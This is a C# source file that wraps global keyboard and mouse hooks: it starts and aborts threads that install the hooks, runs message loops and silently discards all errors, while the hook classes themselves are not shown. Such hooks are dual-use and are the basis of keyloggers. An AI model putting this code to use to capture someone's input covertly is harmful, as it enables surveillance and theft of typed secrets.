using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace HookHardware
{
    public static class Global
    {
		public static Thread keyboadThread = new Thread(KeyboardThread);
		public static Keyboard keyboardHook = new Keyboard();

		public static Thread mouseThread = new Thread(MouseThread);
		public static Mouse mouseHook = new Mouse();

		public static void HookKeyboard()
		{
			try
			{
				keyboadThread.Start();
			}
			catch { }
		}

		private static void KeyboardThread()
		{
			try
			{
				keyboardHook.HookKeyboard();
				Application.Run();
			}
			catch { }
		}

		public static void UnhookKeyboard()
		{
			keyboadThread.Abort();
			keyboardHook.AbortHook();
		}

		public static void HookMouse()
		{
			try
			{
				mouseThread.Start();
			}
			catch { }
		}
		private static void MouseThread()
		{
			try
			{
				mouseHook.HookMouse();
				Application.Run();
			}
			catch { }
		}
		public static void UnhookMouse()
		{
			mouseThread.Abort();
			mouseHook.AbortHook();
		}
	}
}
